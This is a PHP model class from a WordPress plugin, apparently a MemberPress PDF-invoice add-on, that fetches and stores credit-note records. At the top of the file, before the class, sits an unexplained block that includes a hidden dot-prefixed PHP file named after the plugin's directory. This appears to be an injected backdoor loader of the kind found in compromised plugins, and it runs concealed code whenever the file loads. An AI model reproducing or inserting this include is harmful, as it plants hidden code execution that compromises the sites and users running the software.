<?php if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MePdfCreditNote extends MeprBaseModel {
  public function __construct($obj = null) {
    $this->initialize(
      array(
        'id'  => 0,
        'invoice_number'  => 0,
        'created_at'  => null
      ),
      $obj
    );
  }

  public static function get_credit_num($invoice_num){
    $db = MePdfDB::fetch();
    $credit_num = $db->get_one_record($db->credit_notes, array('invoice_number' => $invoice_num));
    if($credit_num){
      return $credit_num->id;
    }
    return false;
  }

  public function store(){
    $db = MePdfDB::fetch();

    if(absint($this->invoice_number) <= 0){
      return;
    }

    if(is_null($this->created_at) || empty($this->created_at)) {
      $this->created_at = MeprUtils::ts_to_mysql_date(time());
    }

    $args = (array)$this->get_values();
    return $db->create_record($db->credit_notes, $args, false);
  }

  public function destroy (){}

}
